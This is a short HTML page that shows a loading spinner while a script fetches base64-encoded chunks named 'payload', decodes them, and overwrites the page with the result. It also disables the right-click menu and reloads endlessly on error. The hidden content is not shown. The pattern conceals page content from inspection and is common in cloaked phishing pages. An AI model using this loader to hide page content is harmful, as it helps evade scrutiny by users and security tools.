<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body { background: #000; margin: 0; overflow: hidden; height: 100vh; display: flex; align-items: center; justify-content: center; }
        .loader { width: 40px; height: 40px; border: 2px solid #333; border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <script>
    (function() {
        
        const parts = ['payload/part_0.txt','payload/part_1.txt'];

        
        Promise.all(parts.map(url => fetch(url).then(r => r.text())))
            .then(chunks => {
                
                const fullBase64 = chunks.join('');

                
                const html = decodeURIComponent(escape(window.atob(fullBase64)));

                
                document.open();
                document.write(html);
                document.close();

                
                document.addEventListener('contextmenu', e => e.preventDefault());
            })
            .catch(err => {
                console.error("Load Error");
                location.reload();
            });
    })();
    </script>
</body>
</html>
